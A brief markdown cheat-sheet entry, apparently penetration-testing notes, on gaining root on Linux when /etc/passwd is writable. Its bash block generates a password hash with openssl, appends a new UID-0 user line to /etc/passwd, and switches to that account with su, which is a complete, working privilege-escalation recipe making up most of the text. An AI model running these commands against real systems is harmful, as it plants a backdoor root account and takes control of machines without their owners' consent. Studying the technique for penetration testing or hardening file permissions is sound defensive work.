---
title: insecure passwd file permissions
date: M02-03-2023
author: i4
---
- Check permissions on `/etc/passwd` if it's writable it's possible to use it for privesc.
- Generating a usable hash for `/etc/passwd`
- `/etc/passwd` takes priority in some distributions
- Uses the [Crypt](https://en.wikipedia.org/wiki/Crypt_(C)) algorithm
```bash
$ openssl passwd hunter2
lTJS0EnBV9DG.
$ echo "whatever:lTJS0EnBV9DG.:0:0:root:/root:/bin/bash" >> /etc/passwd
$ su whatever
```
